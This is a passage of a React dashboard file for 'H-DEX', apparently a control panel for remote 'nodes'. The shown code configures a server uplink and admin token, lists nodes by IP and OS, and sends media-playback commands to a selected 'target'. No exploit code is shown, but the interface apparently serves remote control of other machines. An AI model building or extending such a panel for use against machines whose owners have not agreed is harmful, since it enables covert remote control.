                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>LOOP</label>
                    <select value={mediaLoop ? 'yes' : 'no'} onChange={e => setMediaLoop(e.target.value === 'yes')}
                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }}>
                      <option value="yes">Yes</option><option value="no">No</option></select></div>
                </>}
              </div>

              <div style={{ display: 'flex', gap: '1rem' }}>
                <button onClick={() => {
                  if (!mediaUrl) return;
                  const cmd = mediaType === 'image' ? 'show_image_url' : mediaType === 'video' ? 'play_video_url' : 'play_audio_url';
                  const data: any = { url: mediaUrl };
                  if (mediaType === 'image') { data.duration = mediaDuration; data.scale = mediaScale; }
                  if (mediaType === 'video') data.fullscreen = mediaFullscreen;
                  if (mediaType === 'audio') { data.volume = mediaVolume; data.loop = mediaLoop; }
                  sendCommand(cmd, data);
                  setMediaModal(false);
                }} className="btn" style={{ flex: 1, borderColor: accentColor, color: accentColor }}>SEND</button>
                <button onClick={() => setMediaModal(false)} className="btn" style={{ flex: 1, background: '#111' }}>CANCEL</button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* SETTINGS MODAL */}
      <AnimatePresence>
        {showSettings && (
          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.92)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
              className="card" style={{ width: '500px', padding: '2rem', border: `1px solid ${accentColor}` }}>
              <div style={{ fontSize: '0.7rem', fontWeight: '800', letterSpacing: '3px', marginBottom: '1.5rem', color: accentColor }}>UPLINK CONFIG</div>
              <div style={{ marginBottom: '1.5rem' }}>
                <label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.5rem', letterSpacing: '2px' }}>SERVER URL</label>
                <input type="text" value={hdexUrl} onChange={e => setHdexUrl(e.target.value)} placeholder="https://..." style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid #222', color: '#fff', fontFamily: 'monospace', fontSize: '0.7rem' }} />
              </div>
              <div style={{ marginBottom: '2rem' }}>
                <label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.5rem', letterSpacing: '2px' }}>ACCESS TOKEN</label>
                <input type="password" value={hdexToken} onChange={e => setHdexToken(e.target.value)} placeholder="ADMIN_SECRET" style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid #222', color: '#fff', fontFamily: 'monospace', fontSize: '0.7rem' }} />
              </div>
              <button onClick={() => { localStorage.setItem('hdex_url', hdexUrl); localStorage.setItem('hdex_token', hdexToken); setShowSettings(false); connectWS(); }}
                className="btn" style={{ width: '100%', borderColor: accentColor, color: accentColor, padding: '1rem', fontSize: '0.65rem', letterSpacing: '3px' }}>
                SAVE & RECONNECT
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* TOP HEADER */}
      <header style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '0.6rem 1rem', background: '#050505', borderBottom: '1px solid #111', flexShrink: 0 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.8rem' }}>
          <ShieldCheck size={20} color={accentColor} />
          <span style={{ fontSize: '0.85rem', fontWeight: '900', letterSpacing: '4px', color: '#fff' }}>H-DEX</span>
          <span style={{ fontSize: '0.45rem', color: '#555', letterSpacing: '2px', border: '1px solid #222', padding: '0.2rem 0.5rem', borderRadius: '2px' }}>v2.0</span>
        </div>
        <div style={{ display: 'flex', gap: '2rem', marginLeft: '2rem', fontSize: '0.55rem', fontFamily: 'monospace', color: '#444' }}>
          <span>NODES: <strong style={{ color: accentColor }}>{nodes.length}</strong></span>
          <span>UPLINK: <strong style={{ color: wsConnected ? successColor : dangerColor }}>{wsConnected ? 'SECURE' : 'OFFLINE'}</strong></span>
          <span>TARGET: <strong style={{ color: selectedNode ? '#fff' : '#555' }}>{selectedNode?.name || 'NONE'}</strong></span>
          <span style={{ color: '#222' }}>|</span>
          <span style={{ color: '#333' }}>{hdexUrl.replace('https://', '').replace('wss://', '').split('/')[0]}</span>
        </div>
        <div style={{ flex: 1 }} />
        <div style={{ display: 'flex', gap: '0.4rem' }}>
          <button onClick={() => setShowSettings(true)} className="btn" style={{ padding: '0.4rem 0.6rem', borderColor: '#1a1a1a', fontSize: '0.5rem' }}><Settings size={14} /></button>
          <button onClick={connectWS} className="btn" style={{ padding: '0.4rem 0.6rem', borderColor: '#1a1a1a', fontSize: '0.5rem' }}><RefreshCcw size={14} /></button>
          <button onClick={() => setSidebarOpen(!sidebarOpen)} className="btn" style={{ padding: '0.4rem 0.6rem', borderColor: '#1a1a1a', fontSize: '0.5rem' }}>{sidebarOpen ? <PanelRight size={14} /> : <PanelRight size={14} />}</button>
          <button onClick={() => setShowLogs(!showLogs)} className="btn" style={{ padding: '0.4rem 0.6rem', borderColor: '#1a1a1a', fontSize: '0.5rem' }}>{showLogs ? <PanelBottom size={14} /> : <PanelBottom size={14} />}</button>
        </div>
      </header>

      {/* MAIN LAYOUT */}
      <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>
        {/* LEFT SIDEBAR — NODE LIST */}
        {sidebarOpen && (
          <div style={{ width: '280px', background: '#050505', borderRight: '1px solid #111', display: 'flex', flexDirection: 'column', flexShrink: 0 }}>
            <div style={{ padding: '0.8rem', borderBottom: '1px solid #111' }}>
              <div style={{ fontSize: '0.5rem', color: '#555', letterSpacing: '2px', marginBottom: '0.6rem' }}>REMOTE NODES</div>
              <input type="text" placeholder="FILTER..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)}
                style={{ width: '100%', background: '#000', border: '1px solid #1a1a1a', padding: '0.5rem 0.7rem', fontSize: '0.6rem', color: '#fff', fontFamily: 'monospace' }} />
            </div>
            <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
              {filteredNodes.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '2rem', opacity: 0.15 }}>
                  <Monitor size={32} />
                  <div style={{ fontSize: '0.55rem', marginTop: '0.5rem' }}>NO NODES</div>
                </div>
              ) : filteredNodes.map(node => (
                <motion.div key={node.id} whileHover={{ x: 2 }}
                  onClick={() => setSelectedNode(node)}
                  style={{ padding: '0.7rem 0.8rem', border: '1px solid #111', marginBottom: '0.4rem', cursor: 'pointer', borderRadius: '4px', background: selectedNode?.id === node.id ? `${accentColor}12` : 'transparent', borderLeft: selectedNode?.id === node.id ? `2px solid ${accentColor}` : '1px solid #111' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: '0.65rem', fontWeight: '800' }}>{node.name || node.id.slice(0, 12)}</span>
                    <span style={{ fontSize: '0.5rem', color: node.status === 'Online' ? successColor : dangerColor }}>●</span>
                  </div>
                  <div style={{ fontSize: '0.48rem', color: '#555', fontFamily: 'monospace', marginTop: '4px' }}>{node.ip} · {node.os?.slice(0, 25)}</div>
                  {node.tag && <div style={{ fontSize: '0.45rem', color: accentColor, marginTop: '2px' }}>#{node.tag}</div>}
                </motion.div>
              ))}
            </div>
          </div>
        )}

        {/* CENTER — MODULE CONTENT */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          {/* MODULE TABS */}
          <div style={{ display: 'flex', gap: '2px', padding: '0.3rem 0.3rem 0 0.3rem', background: '#030303', borderBottom: '1px solid #111', overflowX: 'auto', flexShrink: 0 }}>
            {modules.map(m => (
              <button key={m.id} onClick={() => setActiveModule(m.id)}
                style={{
                  padding: '0.55rem 0.9rem', fontSize: '0.55rem', letterSpacing: '1px', fontWeight: '800', fontFamily: 'monospace',
                  color: activeModule === m.id ? accentColor : '#444',
                  background: activeModule === m.id ? '#0a0a0a' : 'transparent',
                  border: 'none', borderBottom: activeModule === m.id ? `2px solid ${accentColor}` : '2px solid transparent',
                  cursor: 'pointer', whiteSpace: 'nowrap', display: 'flex', alignItems: 'center', gap: '0.4rem',
                  transition: 'all 0.15s ease',
                }}>
                {React.createElement(m.icon, { size: 12 })}
                {m.label}
              </button>
            ))}
          </div>

          {/* MODULE CONTENT */}
          <div style={{ flex: 1, overflow: 'hidden', background: '#050505' }}>
            <AnimatePresence mode="wait">
              <motion.div key={activeModule} initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -5 }} transition={{ duration: 0.15 }}
                style={{ height: '100%', overflow: 'hidden' }}>
                {renderModuleContent()}
              </motion.div>
            </AnimatePresence>
          </div>
        </div>
      </div>

      {/* LOGS BAR */}
      {showLogs && (
        <div style={{ height: '160px', background: '#030303', borderTop: '1px solid #111', display: 'flex', flexDirection: 'column', flexShrink: 0 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0.3rem 1rem', borderBottom: '1px solid #0a0a0a' }}>
            <span style={{ fontSize: '0.5rem', color: '#444', letterSpacing: '2px', fontFamily: 'monospace' }}>CORE LOGS</span>
            <button onClick={() => setLogs([])} className="btn" style={{ fontSize: '0.45rem', padding: '0.15rem 0.5rem' }}>CLEAR</button>
          </div>
          <div style={{ flex: 1, overflowY: 'auto', padding: '0.3rem 1rem', fontFamily: 'monospace', fontSize: '0.55rem' }}>
            {logs.length === 0 ? (
              <span style={{ color: '#222' }}>AWAITING SIGNALS...</span>
            ) : logs.map(log => (
              <div key={log.id} style={{ marginBottom: '2px' }}>
                <span style={{ opacity: 0.25 }}>[{log.time}]</span>
                <span style={{ marginLeft: '6px', color: log.type === 'error' ? dangerColor : log.type === 'success' ? successColor : log.type === 'result' ? '#fff' : log.type === 'cmd' ? accentColor : '#444' }}>{log.text}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

// React.createElement workaround for string icons
const Moon = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>;
const Send = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>;
const Pickaxe = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>;
const Key = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>;
const Cloud = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9z"/></svg>;
const Mail = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>;
const Puzzle = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19.439 7.85c-.049.322.059.648.289.878l1.568 1.568c.47.47.706 1.087.706 1.704s-.235 1.233-.706 1.704l-1.611 1.611a.98.98 0 0 1-.837.276c-.47-.07-.802-.48-.968-.925a2.501 2.501 0 1 0-3.214 3.214c.446.166.855.497.925.968a.979.979 0 0 1-.276.837l-1.61 1.611a2.404 2.404 0 0 1-1.705.706 2.405 2.405 0 0 1-1.704-.706l-1.568-1.568a1.026 1.026 0 0 0-.877-.29c-.493.074-.84.504-1.02.968a2.5 2.5 0 1 1-3.237-3.237c.464-.18.894-.527.967-1.02a1.026 1.026 0 0 0-.289-.877l-1.568-1.568A2.402 2.402 0 0 1 1.998 12c0-.617.236-1.234.706-1.704L4.315 8.685a.98.98 0 0 1 .837-.276c.47.07.802.48.968.925a2.501 2.501 0 1 0 3.214-3.214c-.446-.166-.855-.497-.925-.968a.979.979 0 0 1 .276-.837l1.611-1.611a2.404 2.404 0 0 1 1.704-.706c.617 0 1.234.236 1.704.706l1.568 1.568c.23.23.556.338.877.29.493-.074.84-.504 1.02-.969a2.5 2.5 0 1 1 3.237 3.237c-.464.18-.894.527-.967 1.02z"/></svg>;
const CreditCard = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>;
const Calculator = (props: any) => <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="8" y1="10" x2="8" y2="10"/><line x1="12" y1="10" x2="12" y2="10"/><line x1="16" y1="10" x2="16" y2="10"/><line x1="8" y1="14" x2="8" y2="14"/><line x1="12" y1="14" x2="12" y2="14"/><line x1="16" y1="14" x2="16" y2="14"/><line x1="8" y1="18" x2="8" y2="18"/><line x1="12" y1="18" x2="12" y2="18"/><line x1="16" y1="18" x2="16" y2="18"/></svg>;

export default HDexPage;
